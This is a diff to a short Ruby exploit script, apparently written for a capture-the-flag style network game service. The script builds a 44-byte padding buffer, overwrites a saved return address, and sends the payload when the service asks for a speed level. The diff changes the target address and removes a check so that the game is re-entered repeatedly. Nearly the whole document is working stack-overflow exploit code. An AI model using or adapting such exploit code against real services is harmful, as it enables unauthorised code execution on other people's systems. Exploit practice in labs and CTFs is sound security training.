@@ -9,7 +9,7 @@ port = PORT
 buf = ''
 44.times { buf << 'a' }
 # fill the return address
-buf << "\xcd\x88\x04\x08"
+buf << "\x34\xb0\x04\x08"
 buf << "\r\n"
 puts buf
 
@@ -20,7 +20,7 @@ while line = s.gets
 
   # send choice to start game
   # played not equal 0 means we have played once
-  (line.chop.eql? '3.Exit') && (played == 0) && s.send("1\r\n", 0)
+  (line.chop.eql? '3.Exit') && s.send("1\r\n", 0)
   # send speed setting
   (line.chop.eql? 'Choose the speed level(1-9):') && s.send(buf, 0)
 
